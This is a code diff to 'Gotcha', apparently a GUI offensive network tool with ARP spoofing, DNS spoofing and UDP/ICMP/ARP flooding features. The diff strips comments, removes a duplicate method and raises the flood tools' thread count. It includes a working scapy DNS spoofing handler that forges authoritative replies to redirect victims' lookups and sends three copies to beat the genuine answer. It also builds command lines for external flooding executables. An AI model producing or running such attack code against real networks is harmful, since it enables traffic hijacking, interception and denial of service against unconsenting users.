@@ -33,7 +33,6 @@ def find_exe(exe_name):
         os.path.join(base_dir, exe_name),
         os.path.join(os.getcwd(), "bin", exe_name),
         os.path.join(os.getcwd(), exe_name),
-        
     ]
     for path in search_paths:
         if os.path.isfile(path):
@@ -630,7 +629,7 @@ class Gotcha:
             'last_intercepted': 0,
             'last_spoofed': 0
         }
-        self.dns_spoof_rules = {}  # domain_pattern -> ip
+        self.dns_spoof_rules = {}
         self.dns_spoof_lock = threading.Lock()
         self.dns_spoof_ttl = 5
 
@@ -701,7 +700,6 @@ class Gotcha:
         arp_spoof_frame = ttk.Frame(attacks_notebook)
         attacks_notebook.add(arp_spoof_frame, text="ARP Spoofing")
         self.setup_arp_spoof_tab(arp_spoof_frame)
-        # DNS Spoofing tab
         dns_spoof_frame = ttk.Frame(attacks_notebook)
         attacks_notebook.add(dns_spoof_frame, text="DNS Spoofing")
         self.setup_dns_spoof_tab(dns_spoof_frame)
@@ -1558,7 +1556,6 @@ class Gotcha:
     def start_dns_spoof(self):
         if self.dns_spoof_running:
             return
-        # Load TTL
         try:
             ttl = int(self.dns_spoof_ttl_entry.get())
             if ttl <= 0:
@@ -1568,7 +1565,6 @@ class Gotcha:
             self.dns_spoof_ttl = 5
             self.dns_spoof_ttl_entry.delete(0, tk.END)
             self.dns_spoof_ttl_entry.insert(0, "5")
-        # Add catch-all rule if enabled
         with self.dns_spoof_lock:
             if self.dns_spoof_all_var.get():
                 self.dns_spoof_rules["*"] = self.dns_rule_ip.get().strip() if self.dns_rule_ip.get().strip() else "127.0.0.1"
@@ -1598,7 +1594,6 @@ class Gotcha:
             self.dns_spoof_thread.join(timeout=2.0)
         self.dns_spoof_start_btn.config(state='normal')
         self.dns_spoof_stop_btn.config(state='disabled')
-        # Remove catch-all rule if it was auto-added
         with self.dns_spoof_lock:
             if self.dns_spoof_all_var.get() and "*" in self.dns_spoof_rules:
                 del self.dns_spoof_rules["*"]
@@ -1617,48 +1612,38 @@ class Gotcha:
         def handle_dns_packet(packet):
             if not self.dns_spoof_running:
                 return True
-            # Перехватываем только DNS-запросы (qr=0)
             if DNS in packet and packet[DNS].qr == 0:
                 qname = packet[DNS].qd.qname.decode('utf-8').rstrip('.')
                 spoof_ip = None
                 with self.dns_spoof_lock:
-                    # Точное совпадение
                     if qname in self.dns_spoof_rules:
                         spoof_ip = self.dns_spoof_rules[qname]
                     else:
-                        # Маски (например, *.example.com)
                         for pattern, ip in self.dns_spoof_rules.items():
                             if pattern.startswith("*.") and qname.endswith(pattern[1:]):
                                 spoof_ip = ip
                                 break
-                            elif pattern == "*":  # catch-all
+                            elif pattern == "*":
                                 spoof_ip = ip
                 if spoof_ip:
                     try:
-                        # Создаём поддельный ответ
                         if IPv6 in packet:
                             ip_layer = IPv6(src=packet[IPv6].dst, dst=packet[IPv6].src)
                         else:
                             ip_layer = IP(src=packet[IP].dst, dst=packet[IP].src)
-
                         udp_layer = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
-
                         dns_response = DNS(
                             id=packet[DNS].id,
                             qr=1,
                             aa=1,
                             ra=0,
                             qd=packet[DNS].qd,
-                            an=DNSRR(rrname=qname, ttl=1, rdata=spoof_ip)  # TTL = 1 секунда
+                            an=DNSRR(rrname=qname, ttl=1, rdata=spoof_ip)
                         )
-
                         response = ip_layer / udp_layer / dns_response
-
-                        # Отправляем 3 копии с задержкой 1 мс, чтобы опередить реальный ответ
                         for attempt in range(3):
                             send(response, verbose=0, iface=self.dns_spoof_interface.get())
                             time.sleep(0.001)
-
                         with self.dns_spoof_lock:
                             self.dns_spoof_stats['spoofed'] += 1
                         self.dns_spoof_log.insert('end', f"[SPOOF] {qname} -> {spoof_ip} (3 копии, TTL=1)\n")
@@ -1670,10 +1655,7 @@ class Gotcha:
                     self.dns_spoof_log.see('end')
                 with self.dns_spoof_lock:
                     self.dns_spoof_stats['intercepted'] += 1
-
             return False
-
-        # Перехватываем и UDP (53), и TCP (53) – для надёжности
         try:
             sniff(
                 iface=self.dns_spoof_interface.get(),
@@ -1978,7 +1960,7 @@ class Gotcha:
             'total_bytes': 0
         }
         self.on_protocol_change()
-        
+
     def on_protocol_change(self, event=None):
         proto = self.custom_protocol.get()
 
@@ -2015,67 +1997,6 @@ class Gotcha:
             self.custom_options_frame.pack(fill='x', padx=5, pady=5, before=self.custom_row7)
         else:
             self.custom_options_frame.pack_forget()
-            
-    def run_external_tool(self, args, log_widget, stop_event, process_key, infinite=False, on_finish=None, stats_callback=None):
-        try:
-            if platform.system() == "Windows":
-                proc = subprocess.Popen(
-                    args,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.STDOUT,
-                    stdin=subprocess.PIPE if infinite else None,
-                    text=True,
-                    bufsize=1,
-                    creationflags=subprocess.CREATE_NO_WINDOW
-                )
-            else:
-                proc = subprocess.Popen(
-                    args,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.STDOUT,
-                    stdin=subprocess.PIPE if infinite else None,
-                    text=True,
-                    bufsize=1
-                )
-            self.external_processes[process_key] = (proc, stop_event)
-            for line in iter(proc.stdout.readline, ''):
-                line = line.strip()
-                if not line:
-                    continue
-                try:
-                    data = json.loads(line)
-                    if data.get('type') == 'stats':
-                        if stats_callback:
-                            self.root.after(0, stats_callback, data)
-                        elapsed = data.get('time', 0)
-                        pps = data.get('pps', 0)
-                        packets = data.get('packets', 0)
-                        log_widget.insert('end', f"{elapsed}s: {pps} pps (total: {packets})\n")
-                        log_widget.see('end')
-                    else:
-                        log_widget.insert('end', line + '\n')
-                        log_widget.see('end')
-                except json.JSONDecodeError:
-                    log_widget.insert('end', line + '\n')
-                    log_widget.see('end')
-                if stop_event.is_set():
-                    if infinite and proc.poll() is None:
-                        try:
-                            proc.stdin.write('\n')
-                            proc.stdin.flush()
-                        except:
-                            pass
-                    else:
-                        proc.terminate()
-                    break
-            proc.wait()
-        except Exception as e:
-            log_widget.insert('end', f"External process error: {str(e)}\n")
-        finally:
-            self.external_processes.pop(process_key, None)
-            log_widget.insert('end', "External process finished.\n")
-            if on_finish:
-                self.root.after(0, on_finish)
 
     def run_external_tool(self, args, log_widget, stop_event, process_key, infinite=False, on_finish=None, stats_callback=None):
         try:
@@ -2166,17 +2087,6 @@ class Gotcha:
                     target_ip, duration, continuous, interface, self._log_custom,
                     on_complete=lambda: self.root.after(0, self.on_dns_finished)
                 )
-            if protocol in ["UDP", "DNS"]:
-                self.custom_attack_stats = {
-                    'start_time': time.time(),
-                    'sent_packets': 0,
-                    'received_packets': 0,
-                    'last_update': time.time(),
-                    'last_sent': 0,
-                    'total_bytes': 0
-                }
-                self.update_custom_attack_stats()
-            elif (protocol in ["TCP", "ICMP"] and socket.has_ipv6):
                 self.custom_attack_stats = {
                     'start_time': time.time(),
                     'sent_packets': 0,
@@ -2206,7 +2116,7 @@ class Gotcha:
             elif protocol == "UDP":
                 exe_name = find_exe("NPudpT.exe")
                 src_ip = self._get_source_ip(interface)
-                args = [exe_name, src_ip, target_ip, str(port), "4", str(duration)]
+                args = [exe_name, src_ip, target_ip, str(port), "8", str(duration)]
                 if dst_mac:
                     args.append(dst_mac)
                 args.append("--packet-size")
@@ -2218,7 +2128,7 @@ class Gotcha:
             elif protocol == "ICMP":
                 exe_name = find_exe("NPicmpT.exe")
                 src_ip = self._get_source_ip(interface)
-                args = [exe_name, src_ip, target_ip, "4", str(duration)]
+                args = [exe_name, src_ip, target_ip, "8", str(duration)]
                 if dst_mac:
                     args.append(dst_mac)
                 args.append("--packet-size")
@@ -2234,7 +2144,7 @@ class Gotcha:
                     return
                 exe_name = find_exe("NParpT.exe")
                 src_ip = self._get_source_ip(interface)
-                args = [exe_name, src_ip, target_ip, "4", str(duration)]
+                args = [exe_name, src_ip, target_ip, "8", str(duration)]
                 if dst_mac:
                     args.append(dst_mac)
                 if random_ip:
